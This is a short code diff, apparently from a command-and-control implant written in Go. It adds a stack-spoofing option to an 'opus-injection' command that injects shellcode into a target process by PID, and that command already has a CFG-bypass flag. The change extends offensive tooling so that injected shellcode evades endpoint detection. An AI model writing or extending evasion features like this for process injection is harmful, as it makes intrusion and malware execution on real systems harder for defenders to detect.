@@ -106,6 +106,7 @@ type OpusInjectionParams struct {
 	PID          int    `json:"pid"`
 	Variant      int    `json:"variant"`
 	CFGBypass    bool   `json:"cfg_bypass"` // Mark shellcode as valid CFG target before callback execution
+	StackSpoof   bool   `json:"stack_spoof"`
 }
 
 // Execute executes the opus-injection command
@@ -134,6 +135,11 @@ func (c *OpusInjectionCommand) Execute(task structs.Task) structs.CommandResult 
 
 	if len(shellcode) == 0 {
 		return errorResult("Error: Shellcode data is empty")
+	}
+
+	if params.StackSpoof {
+		SetAPISpoofEnabled(true)
+		defer SetAPISpoofEnabled(false)
 	}
 
 	var output string
